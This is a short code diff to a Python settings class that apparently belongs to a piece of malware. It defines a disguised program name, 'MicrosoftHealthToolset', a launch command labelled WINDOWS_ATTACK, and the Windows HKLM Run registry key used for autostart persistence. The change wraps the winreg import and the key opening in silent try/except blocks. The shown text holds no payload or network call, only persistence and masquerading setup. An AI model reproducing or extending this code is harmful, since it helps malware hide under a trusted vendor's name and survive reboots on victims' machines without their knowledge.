@@ -1,5 +1,7 @@
-import winreg
-
+try:
+    import winreg
+except:
+    pass
 
 class Settings:
     WINDOWS_APPLICATION_NAME = "MicrosoftHealthToolset"
@@ -8,5 +10,8 @@ class Settings:
     WINDOWS_ATTACK = f"{WINDOWS_FULL_PATH} --run"
 
     WINDOWS_WINREG_DIR = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-    WINREG_KEY_PATH = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, WINDOWS_WINREG_DIR)
+    try:
+        WINREG_KEY_PATH = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, WINDOWS_WINREG_DIR)
+    except:
+        pass
     WINDOWS_WINREG_NAME = f"{WINDOWS_APPLICATION_NAME}"
